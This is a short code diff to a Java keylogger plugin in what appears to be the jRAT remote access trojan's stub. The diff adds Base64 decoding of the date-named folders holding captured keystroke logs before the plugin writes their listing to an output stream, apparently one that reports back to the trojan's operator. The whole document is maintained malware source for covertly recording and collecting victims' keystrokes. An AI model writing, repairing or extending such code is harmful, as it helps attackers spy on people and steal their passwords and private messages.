@@ -16,6 +16,7 @@ import pro.jrat.plugin.stub.activities.Activities;
 import pro.jrat.plugin.stub.activities.Activity;
 import pro.jrat.plugin.stub.activities.Key;
 import pro.jrat.plugin.stub.activities.Title;
+import pro.jrat.plugin.stub.codec.Base64;
 
 public class KeyloggerPlugin extends StubPlugin {
 
@@ -67,21 +68,21 @@ public class KeyloggerPlugin extends StubPlugin {
 			dos.writeInt(years.length);
 			
 			for (File year : years) {
-				dos.writeUTF(year.getName());
+				dos.writeUTF(Base64.decode(year.getName()));
 				
 				File[] months = year.listFiles();
 				
 				dos.writeInt(months.length);
 				
 				for (File month : months) {
-					dos.writeUTF(month.getName());
+					dos.writeUTF(Base64.decode(month.getName()));
 					
 					File[] days = month.listFiles();
 					
 					dos.writeInt(days.length);
 					
 					for (File day : days) {
-						dos.writeUTF(day.getName());
+						dos.writeUTF(Base64.decode(day.getName()));
 					}
 				}
 			}
